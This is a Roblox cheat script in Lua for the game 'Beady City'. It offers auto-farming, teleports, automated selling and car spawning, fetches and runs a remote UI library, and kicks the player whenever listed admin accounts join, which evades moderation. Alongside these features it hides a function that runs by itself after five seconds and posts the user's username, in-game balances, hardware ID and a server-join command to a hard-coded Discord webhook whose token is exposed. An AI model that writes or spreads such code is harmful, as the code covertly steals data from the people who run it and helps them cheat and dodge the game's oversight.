repeat wait() until game:IsLoaded() and game.Players and game.Players.LocalPlayer and game.Players.LocalPlayer.Character
local player = game.Players.LocalPlayer
local human = player.Character.Humanoid
local Body = player.Character.Torso or player.Character.HumanoidRootPart
local Destination;
local path = game:GetService("PathfindingService"):CreatePath()
local Make = false
local userids = {
	{userid = 3455579746},
	{userid = 3410845441},
	{userid = 2566770821},
	{userid = 2388252007},
	{userid = 4483930996},
	{userid = 840058793},
	{userid = 3870200602},
	{userid = 693302100},
	{userid = 4535921838},
	{userid = 3576811652},
	{userid = 2017835654},
	{userid = 483055395},
	{userid = 5055131530},
	{userid = 4519761851},
}
local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/deeeity/mercury-lib/master/src.lua"))()
local GUI = Mercury:Create{
    Name = "Doreamon Shop",
    Size = UDim2.fromOffset(600, 400),
    Theme = Mercury.Themes.Dark,
    Link = "https://github.com/deeeity/mercury-lib"
}
local Tab = GUI:Tab{
	Name = "Main",
	Icon = "rbxassetid://4034483344"
}
local Tab2 = GUI:Tab{
	Name = "Teleport",
	Icon = "rbxassetid://6723742952"
}
local Target = Tab:Dropdown{
	Name = "Name",
	StartingText = "Select...",
	Description = nil,
	Items = {
		{"Orange", "Orange"},
		{"Mango", "Mango"},
		{"Banana", "Banana"},
		{"Rock", "Rock"},
		{"Meat","Meat"},
		{"Vegetable","Vegetable"},
		{"Crab","Crab"},
		{"Coconut","Coconut"},
		{"Strawberry","Strawberry"},
		{"Leaf","Leaf"},
		{"RedLeaf","RedLeaf"},
		{"Garbage","Garbage"},
		{"Tresure","Tresure"},
		{"Wood","Wood"},
		{"Pumpkin","Pumpkin"},
		{"Scraplron","Scraplron"},
		{"OilBarrel","OilBarrel"},
	},
	Callback = function(item)
		_G.Target = item
	end
}
Tab:Toggle{
	Name = "Full Auto Farm",
	StartingState = false,
	Description = nil,
	Callback = function(state) 
        _G.AutoWalk = state
    end
}
local SellDown = Tab:Dropdown{
	Name = "Name",
	StartingText = "Select...",
	Description = nil,
	Items = {
		{"Banana", "Banana"},
		{"BlueGem", "BlueGem"},
		{"Clown_Fish", "Clown_Fish"},
		{"Coconut", "Coconut"},
		{"Crab", "Crab"},
		{"CuteCat","CuteCat"},
		{"Diamond","Diamond"},
		{"Fish","Fish"},
		{"Garbage","Garbage"},
		{"Gold","Gold"},
		{"Iron","Iron"},
		{"Lobster","Lobster"},
		{"Mackerel_Fish","Mackerel_Fish"},
		{"Mango","Mango"},
		{"MeatPack","MeatPack"},
		{"OilBarrel","OilBarrel"},
		{"Orange","Orange"},
		{"Pumpkin","Pumpkin"},
		{"RedGem","RedGem"},
		{"SheetSteel","SheetSteel"},
		{"Strawberry","Strawberry"},
		{"Vegetable","Vegetable"},
		{"VegetablePack","VegetablePack"},
		{"Vibranium","Vibranium"},
		{"Wood","Wood"},
	},
	Callback = function(item)
		_G.Name = item
	end
}
Tab:Button{
	Name = "Sell",
	Description = nil,
	Callback = function() 
		local Num = game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Container.NumberBox.TextBox
			local vim = game:GetService'VirtualInputManager'
			local virtualUser = game:GetService('VirtualUser')
			local Economy = game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame["Out_Frame"].ScrollingFrame[_G.Target].Seller
			local Number = game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Container.NumberBox.TextBox
			local Ok = game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Container.Bottom.Ok
			game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame.Visible = true
			wait(0.1)
			for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame["Out_Frame"].ScrollingFrame:GetChildren()) do
				if v.Name ~= _G.Target and v:FindFirstChild("Seller") then
					v.Visible = false
				end
			end
			wait(0.1)
			vim:SendMouseButtonEvent(Economy.AbsolutePosition.X+Economy.AbsoluteSize.X/2,Economy.AbsolutePosition.Y+50,0,true,Economy,1)
			vim:SendMouseButtonEvent(Economy.AbsolutePosition.X+Economy.AbsoluteSize.X/2,Economy.AbsolutePosition.Y+50,0,false,Economy,1)
			wait(0.1)
			vim:SendMouseButtonEvent(Number.AbsolutePosition.X+Number.AbsoluteSize.X/2,Number.AbsolutePosition.Y+50,0,true,Number,1)
			vim:SendMouseButtonEvent(Number.AbsolutePosition.X+Number.AbsoluteSize.X/2,Number.AbsolutePosition.Y+50,0,false,Number,1)
			wait(0.2)
			Num.Text = game:GetService("Players").LocalPlayer.ItemGame[_G.Target].Value
			wait(0.1)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(406.278564, 3.54249907, 164.623413, 0.188324571, 8.48139265e-08, -0.982106864, 3.55088603e-09, 1, 8.7040064e-08, 0.982106864, -1.9879133e-08, 0.188324571)
			wait(0.2)
			vim:SendMouseButtonEvent(Ok.AbsolutePosition.X+Ok.AbsoluteSize.X/2,Ok.AbsolutePosition.Y+50,0,true,Ok,1)
			vim:SendMouseButtonEvent(Ok.AbsolutePosition.X+Ok.AbsoluteSize.X/2,Ok.AbsolutePosition.Y+50,0,false,Ok,1)
			wait(0.5)
			for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame["Out_Frame"].ScrollingFrame:GetChildren()) do
				if v.Name ~= _G.Target and v:FindFirstChild("Seller") then
					v.Visible = true
				end
			end
			wait(0.1)
			game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame.Visible = false
	end
}
local TargetTP = Tab2:Dropdown{
	Name = "Name",
	StartingText = "Select...",
	Description = nil,
	Items = {
		{"Orange", "Orange"},
		{"Mango", "Mango"},
		{"Banana", "Banana"},
		{"Rock", "Rock"},
		{"Meat","Meat"},
		{"Vegetable","Vegetable"},
		{"Crab","Crab"},
		{"Coconut","Coconut"},
		{"Strawberry","Strawberry"},
		{"Leaf","Leaf"},
		{"RedLeaf","RedLeaf"},
		{"Garbage","Garbage"},
		{"Tresure","Tresure"},
		{"Wood","Wood"},
		{"Pumpkin","Pumpkin"},
		{"Scraplron","Scraplron"},
		{"OilBarrel","OilBarrel"},
	},
	Callback = function(item)
		_G.TargetTP = item
	end
}
Tab2:Button{
	Name = "Teleport",
	Description = nil,
	Callback = function() 
		player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,3) * CFrame.Angles(-1.5,0,0)
		wait()
		player.Character.HumanoidRootPart.CFrame = game:GetService("Workspace"):WaitForChild("Auto Farm Checking")[_G.TargetTP].CFrame
	end
}
Tab2:Button{
	Name = "Teleport To Club",
	Description = nil,
	Callback = function() 
		player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,3) * CFrame.Angles(-1.5,0,0)
		wait()
		player.Character.HumanoidRootPart.CFrame = CFrame.new(877.226379, 4.26724195, -1761.87952, 0.861953557, -6.75875924e-08, 0.506987214, 6.23928686e-09, 1, 1.22704506e-07, -0.506987214, -1.02602357e-07, 0.861953557)
	end
}
Tab2:Button{
	Name = "เสกรถ",
	Description = nil,
	Callback = function()
		local ohInstance1 = game:GetService("Players").LocalPlayer.PlayerGui.SystemCar.SpawnCar
		local ohInstance2 = workspace.SpawnerCar_[utf8.char(3626, 3611, 3634, 3623, 3619, 3606)].VectorFolder
		game:GetService("ReplicatedStorage").Remote._SpawnCar:FireServer(ohInstance1, ohInstance2)
		wait(2)
		local vim = game:GetService'VirtualInputManager'
		local Enter = game:GetService("Players").LocalPlayer.PlayerGui["Garage_System"].OutFrame.Spawn
		wait(0.1)
		vim:SendMouseButtonEvent(Enter.AbsolutePosition.X+Enter.AbsoluteSize.X/2,Enter.AbsolutePosition.Y+50,0,true,Enter,1)
		vim:SendMouseButtonEvent(Enter.AbsolutePosition.X+Enter.AbsoluteSize.X/2,Enter.AbsolutePosition.Y+50,0,false,Enter,1)
	end
}
spawn(function()
	while wait() do
        pcall(function()
            local anti = game:GetService("VirtualUser")
                game:GetService("Players").LocalPlayer.Idled:connect(function()
                anti:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
                wait(1)
                anti:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
            end)
        end)
    end
end)
spawn(function()
	while wait() do
		pcall(function()
			if game:GetService("Players").LocalPlayer.ItemGame[_G.Target].Value >= _G.Vetables and _G.AutoSell == true then 
				wait()
				local Num = game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Container.NumberBox.TextBox
				local vim = game:GetService'VirtualInputManager'
				local virtualUser = game:GetService('VirtualUser')
				local Economy = game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame["Out_Frame"].ScrollingFrame.Vegetable.Seller
				local Number = game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Container.NumberBox.TextBox
				local Ok = game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Container.Bottom.Ok
				local Cancel = game:GetService("Players").LocalPlayer.PlayerGui.SomethingUI.Frame.FrameTypes.Cancel
				wait(0.1)
				vim:SendMouseButtonEvent(Cancel.AbsolutePosition.X+Cancel.AbsoluteSize.X/2,Cancel.AbsolutePosition.Y+50,0,true,Cancel,1)
				vim:SendMouseButtonEvent(Cancel.AbsolutePosition.X+Cancel.AbsoluteSize.X/2,Cancel.AbsolutePosition.Y+50,0,false,Cancel,1)
				wait(0.5)
				game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame.Visible = true
				wait(0.1)
				for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame["Out_Frame"].ScrollingFrame:GetChildren()) do
					if v.Name ~= _G.Target and v:FindFirstChild("Seller") then
						v.Visible = false
					end
				end
				wait(0.1)
				vim:SendMouseButtonEvent(Economy.AbsolutePosition.X+Economy.AbsoluteSize.X/2,Economy.AbsolutePosition.Y+50,0,true,Economy,1)
				vim:SendMouseButtonEvent(Economy.AbsolutePosition.X+Economy.AbsoluteSize.X/2,Economy.AbsolutePosition.Y+50,0,false,Economy,1)
				wait(0.1)
				vim:SendMouseButtonEvent(Number.AbsolutePosition.X+Number.AbsoluteSize.X/2,Number.AbsolutePosition.Y+50,0,true,Number,1)
				vim:SendMouseButtonEvent(Number.AbsolutePosition.X+Number.AbsoluteSize.X/2,Number.AbsolutePosition.Y+50,0,false,Number,1)
				wait(0.2)
				Num.Text = game:GetService("Players").LocalPlayer.ItemGame[_G.Target].Value
				wait(0.1)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(406.278564, 3.54249907, 164.623413, 0.188324571, 8.48139265e-08, -0.982106864, 3.55088603e-09, 1, 8.7040064e-08, 0.982106864, -1.9879133e-08, 0.188324571)
				wait(0.2)
				vim:SendMouseButtonEvent(Ok.AbsolutePosition.X+Ok.AbsoluteSize.X/2,Ok.AbsolutePosition.Y+50,0,true,Ok,1)
				vim:SendMouseButtonEvent(Ok.AbsolutePosition.X+Ok.AbsoluteSize.X/2,Ok.AbsolutePosition.Y+50,0,false,Ok,1)
				wait(0.5)
				for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame["Out_Frame"].ScrollingFrame:GetChildren()) do
					if v.Name ~= _G.Target and v:FindFirstChild("Seller") then
						v.Visible = true
					end
				end
				wait(0.1)
				game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame.Visible = false
			end
		end)
	end
end)
function Move()
	path:ComputeAsync(Body.Position, Destination.Position)
	if path.Status == Enum.PathStatus.Success then
		local wayPoints = path:GetWaypoints()
		for i = 1, #wayPoints do
			local point = wayPoints[i]
			human:MoveTo(point.Position)
			local success = human.MoveToFinished:Wait()
			if point.Action == Enum.PathWaypointAction.Jump then
				human.WalkSpeed = 0
				wait(0.2)
				human.WalkSpeed = 16
				human.Jump = true
			end
			if not success then
				human.Jump = true
				human:MoveTo(point.Position)
				if not human.MoveToFinished:Wait() then
					break
				end
			end
		end
	end
end
function DiscordHook()
	local HWID = gethwid()
    local url = "https://discord.com/api/webhooks/1164576705223065690/v_CMsHwmX4Bg9NjaNzm0cubwVAXIA9qfHJmuBvUmkAtwMOTPtGQtOqobOC7kF2A0GUaX"
    local data = {
    ["content"] = "",
    ["embeds"] = {
        {
            ["title"] = "***Game: Beady City***",
            ["description"] = "Beady Gay".."\n\n".."**Username:** " .."||"..game.Players.LocalPlayer.Name.."||".."\n"
                                .."**Money: **"..tostring(game:GetService("Players").LocalPlayer.ItemGame.Money.Value).."\n"
                                .."**Red Money: **"..tostring(game:GetService("Players").LocalPlayer.ItemGame.RedMoney.Value).."\n"
                                .."**Bank Money: **"..tostring(game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankText.Text).."\n"
								.."**HWID: **".."\n"
								.."```".."\n"
                                ..tostring(HWID).."\n"
                                .."```"..""
								.."```".."\n"
                                .."game:GetService"..'('..'"'.."TeleportService"..'"'..')'..":TeleportToPlaceInstance"..'('..tostring(game.PlaceId)..", "..'"'..tostring(game.JobId)..'"'..", ".."game.Players.LocalPlayer"..")".."\n"
                                .."```".."",
            ["type"] = "rich",
            ["color"] = tonumber(0x00000),
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                    tostring(game:GetService("Players").LocalPlayer.Name)
            }
        }
    }
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)

    local headers = {
    ["content-type"] = "application/json"
    }
    request = http_request or request or HttpPost or syn.request
    local HOOK = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(HOOK)
end
---------------------------------------------------------------------------------
spawn(function()
	while wait() do
		pcall(function()
			if _G.AutoWalk then
				Distance = (game:GetService("Workspace"):WaitForChild("Auto Farm Checking")[_G.Target].Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
				if Distance > 300 then
					player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,3) * CFrame.Angles(-1.5,0,0)
					wait()
					player.Character.HumanoidRootPart.CFrame = game:GetService("Workspace"):WaitForChild("Auto Farm Checking")[_G.Target].CFrame * CFrame.new(50,5,50)
					wait(2)
				elseif Distance <= 300 then
					for i,v in pairs(game:GetService("Workspace")["Auto Farm Checking"]:GetDescendants()) do
						if v.Name == _G.Target and v:FindFirstChild("remote") and not game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("SomethingUI") then
							Destination = v
							Move()
						elseif game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Remove"):WaitForChild("Beady_BG").Visible == true and game:GetService("Players").LocalPlayer.ItemGame[_G.Target].Value < 30 then
							local vim = game:GetService'VirtualInputManager'
							local Enter = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Remove"):WaitForChild("Beady_BG").Button
							wait(0.1)
							vim:SendMouseButtonEvent(Enter.AbsolutePosition.X+Enter.AbsoluteSize.X/2,Enter.AbsolutePosition.Y+50,0,true,Enter,1)
							vim:SendMouseButtonEvent(Enter.AbsolutePosition.X+Enter.AbsoluteSize.X/2,Enter.AbsolutePosition.Y+50,0,false,Enter,1)
							wait(1)
							for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
								if not v:FindFirstChild("Basket") and v:IsA("Tool") then
									if not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Basket") then
										game:GetService("Players").LocalPlayer.PlayerGui["InventoryNew1.4"].Opimized.RemoteEvent:FireServer("Basket", "", "")
									end
								end
							end
							wait(0.5)
						elseif game:GetService("Players").LocalPlayer.ItemGame[_G.Target].Value >= 30 and game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("SomethingUIthen") then
							local Num = game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Container.NumberBox.TextBox
							local vim = game:GetService'VirtualInputManager'
							local virtualUser = game:GetService('VirtualUser')
							local Economy = game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame["Out_Frame"].ScrollingFrame[_G.Target].Seller
							local Number = game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Container.NumberBox.TextBox
							local Ok = game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Container.Bottom.Ok
							local Cancel = game:GetService("Players").LocalPlayer.PlayerGui.SomethingUI.Frame.FrameTypes.Cancel
							wait(0.1)
							vim:SendMouseButtonEvent(Cancel.AbsolutePosition.X+Cancel.AbsoluteSize.X/2,Cancel.AbsolutePosition.Y+50,0,true,Cancel,1)
							vim:SendMouseButtonEvent(Cancel.AbsolutePosition.X+Cancel.AbsoluteSize.X/2,Cancel.AbsolutePosition.Y+50,0,false,Cancel,1)
							wait(0.1)
							game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame.Visible = true
							wait(0.1)
							for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame["Out_Frame"].ScrollingFrame:GetChildren()) do
								if v.Name ~= _G.Target and v:FindFirstChild("Seller") then
									v.Visible = false
								end
							end
							wait(0.1)
							vim:SendMouseButtonEvent(Economy.AbsolutePosition.X+Economy.AbsoluteSize.X/2,Economy.AbsolutePosition.Y+50,0,true,Economy,1)
							vim:SendMouseButtonEvent(Economy.AbsolutePosition.X+Economy.AbsoluteSize.X/2,Economy.AbsolutePosition.Y+50,0,false,Economy,1)
							wait(0.1)
							vim:SendMouseButtonEvent(Number.AbsolutePosition.X+Number.AbsoluteSize.X/2,Number.AbsolutePosition.Y+50,0,true,Number,1)
							vim:SendMouseButtonEvent(Number.AbsolutePosition.X+Number.AbsoluteSize.X/2,Number.AbsolutePosition.Y+50,0,false,Number,1)
							wait(0.2)
							Num.Text = game:GetService("Players").LocalPlayer.ItemGame[_G.Target].Value
							wait(0.1)
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(406.278564, 3.54249907, 164.623413, 0.188324571, 8.48139265e-08, -0.982106864, 3.55088603e-09, 1, 8.7040064e-08, 0.982106864, -1.9879133e-08, 0.188324571)
							wait(0.2)
							vim:SendMouseButtonEvent(Ok.AbsolutePosition.X+Ok.AbsoluteSize.X/2,Ok.AbsolutePosition.Y+50,0,true,Ok,1)
							vim:SendMouseButtonEvent(Ok.AbsolutePosition.X+Ok.AbsoluteSize.X/2,Ok.AbsolutePosition.Y+50,0,false,Ok,1)
							wait(0.5)
							for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame["Out_Frame"].ScrollingFrame:GetChildren()) do
								if v.Name ~= _G.Target and v:FindFirstChild("Seller") then
									v.Visible = true
								end
							end
							wait(0.1)
							game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame.Visible = false
						elseif game:GetService("Players").LocalPlayer.ItemGame[_G.Target].Value >= 30 and not game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("SomethingUIthen")then
							local Num = game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Container.NumberBox.TextBox
							local vim = game:GetService'VirtualInputManager'
							local virtualUser = game:GetService('VirtualUser')
							local Economy = game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame["Out_Frame"].ScrollingFrame[_G.Target].Seller
							local Number = game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Container.NumberBox.TextBox
							local Ok = game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Container.Bottom.Ok
							game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame.Visible = true
							wait(0.1)
							for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame["Out_Frame"].ScrollingFrame:GetChildren()) do
								if v.Name ~= _G.Target and v:FindFirstChild("Seller") then
									v.Visible = false
								end
							end
							wait(0.1)
							vim:SendMouseButtonEvent(Economy.AbsolutePosition.X+Economy.AbsoluteSize.X/2,Economy.AbsolutePosition.Y+50,0,true,Economy,1)
							vim:SendMouseButtonEvent(Economy.AbsolutePosition.X+Economy.AbsoluteSize.X/2,Economy.AbsolutePosition.Y+50,0,false,Economy,1)
							wait(0.1)
							vim:SendMouseButtonEvent(Number.AbsolutePosition.X+Number.AbsoluteSize.X/2,Number.AbsolutePosition.Y+50,0,true,Number,1)
							vim:SendMouseButtonEvent(Number.AbsolutePosition.X+Number.AbsoluteSize.X/2,Number.AbsolutePosition.Y+50,0,false,Number,1)
							wait(0.2)
							Num.Text = game:GetService("Players").LocalPlayer.ItemGame[_G.Target].Value
							wait(0.1)
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(406.278564, 3.54249907, 164.623413, 0.188324571, 8.48139265e-08, -0.982106864, 3.55088603e-09, 1, 8.7040064e-08, 0.982106864, -1.9879133e-08, 0.188324571)
							wait(0.2)
							vim:SendMouseButtonEvent(Ok.AbsolutePosition.X+Ok.AbsoluteSize.X/2,Ok.AbsolutePosition.Y+50,0,true,Ok,1)
							vim:SendMouseButtonEvent(Ok.AbsolutePosition.X+Ok.AbsoluteSize.X/2,Ok.AbsolutePosition.Y+50,0,false,Ok,1)
							wait(0.5)
							for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame["Out_Frame"].ScrollingFrame:GetChildren()) do
								if v.Name ~= _G.Target and v:FindFirstChild("Seller") then
									v.Visible = true
								end
							end
							wait(0.1)
							game:GetService("Players").LocalPlayer.PlayerGui["Economy_Gui"].Frame.Visible = false
						end
					end
				end
			elseif _G.AutoWalk == false and game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("SomethingUIthen") then
				local vim = game:GetService'VirtualInputManager'
				local Cancel = game:GetService("Players").LocalPlayer.PlayerGui.SomethingUI.Frame.FrameTypes.Cancel
				wait(0.1)
				vim:SendMouseButtonEvent(Cancel.AbsolutePosition.X+Cancel.AbsoluteSize.X/2,Cancel.AbsolutePosition.Y+50,0,true,Cancel,1)
				vim:SendMouseButtonEvent(Cancel.AbsolutePosition.X+Cancel.AbsoluteSize.X/2,Cancel.AbsolutePosition.Y+50,0,false,Cancel,1)
				wait(0.2)
			end
		end)
	end
end)
spawn(function()
	while wait(0.1) do
		pcall(function()
			if _G.AutoWalk == false then
				local vim = game:GetService'VirtualInputManager'
				local Cancel = game:GetService("Players").LocalPlayer.PlayerGui.SomethingUI.Frame.FrameTypes.Cancel
				wait(0.1)
				vim:SendMouseButtonEvent(Cancel.AbsolutePosition.X+Cancel.AbsoluteSize.X/2,Cancel.AbsolutePosition.Y+50,0,true,Cancel,1)
				vim:SendMouseButtonEvent(Cancel.AbsolutePosition.X+Cancel.AbsoluteSize.X/2,Cancel.AbsolutePosition.Y+50,0,false,Cancel,1)
			end
		end)
	end
end)
spawn(function()
	while wait() do
		pcall(function()
			for _, user in ipairs(userids) do
				for i,v in pairs(game:GetService("Players"):GetChildren()) do
					if user.userid == v.UserId then
						game.Players.LocalPlayer:kick("Admin joined")
					else
						wait()
					end
				end
			end
		end)
	end
end)
spawn(function()
	pcall(function()
		wait(5)
		DiscordHook()
	end)
end)
